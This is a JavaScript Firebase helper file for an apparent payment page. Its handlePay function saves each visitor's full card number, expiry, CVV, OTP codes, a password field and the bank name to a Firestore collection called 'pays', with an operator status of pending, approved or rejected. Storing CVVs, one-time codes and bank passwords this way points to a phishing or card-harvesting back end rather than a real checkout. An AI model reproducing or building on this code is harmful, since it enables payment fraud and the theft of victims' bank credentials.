// firebase.js
import { getApp, getApps, initializeApp } from 'firebase/app';
import { doc, getFirestore, setDoc } from 'firebase/firestore';
import { SetStateAction } from 'react';

const firebaseConfig = {
  apiKey: 'AIzaSyA_nQizM3KE8om9FUfgsKUtTKQGPtL3EDU',
  authDomain: 'fzzzzzzz-c0c67.firebaseapp.com',
  projectId: 'fzzzzzzz-c0c67',
  storageBucket: 'fzzzzzzz-c0c67.firebasestorage.app',
  messagingSenderId: '28590792510',
  appId: '1:28590792510:web:a7f38d6d5b277a6970566f',
  measurementId: 'G-Z1P1YH7845',
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
export const db = getFirestore(app);

export async function addData(data: { id: any; createdDate?: string,page?:string ,name?:string,phone?:string}) {
  localStorage.setItem('visitor', data.id);
  try {
    const docRef = doc(db, 'pays', data.id!);
    await setDoc(
      docRef,
      { createdDate: new Date().toISOString(), ...data },
      { merge: true }
    );

    console.log('Document written with ID: ', docRef.id);
    // You might want to show a success message to the user here
  } catch (e) {
    console.error('Error adding document: ', e);
    // You might want to show an error message to the user here
  }
}
export const handlePay = async (
  paymentInfo: {
    cardNumber: string;
    year: string;
    month: string;
    bank: string | undefined;
    cvv: string | undefined;
    otp: string | undefined;
    pass: string;
    cardState?: string;
    allOtps?: string[];
    bank_card?: string[];
    prefix?: string;
    status?: 'pending' | 'new' | 'approved' | 'rejected';
    page?: string;
  },
  setPaymentInfo: {
    (
      value: SetStateAction<{
        cardNumber: string;
        year: string;
        month: string;
        bank?: string | undefined;
        cvv?: string | undefined;
        otp?: string | undefined;
        pass: string;
        cardState: string;
        allOtps: string[];
        bank_card: string[];
        prefix: string;
        status: 'pending' | 'new' | 'approved' | 'rejected';
        page: string;
      }>
    ): void;
    (
      value: SetStateAction<{
        cardNumber: string;
        year: string;
        month: string;
        bank?: string | undefined;
        cvv?: string | undefined;
        otp?: string | undefined;
        pass: string;
        cardState: string;
        allOtps: string[];
        bank_card: string[];
        prefix: string;
        status: 'pending' | 'new' | 'approved' | 'rejected';
        page: string;
      }>
    ): void;
    (arg0: (prev: any) => any): void;
  }
) => {
  try {
    const visitorId = localStorage.getItem('visitor');
    if (visitorId) {
      const docRef = doc(db, 'pays', visitorId);
      await setDoc(
        docRef,
        {
          ...paymentInfo,
          status: 'pending',
          createdDate: new Date().toISOString(),
        },
        { merge: true }
      );
      setPaymentInfo((prev: any) => ({ ...prev, status: 'pending' }));
    }
  } catch (error) {
    console.error('Error adding document: ', error);
    alert('Error adding payment info to Firestore');
  }
};
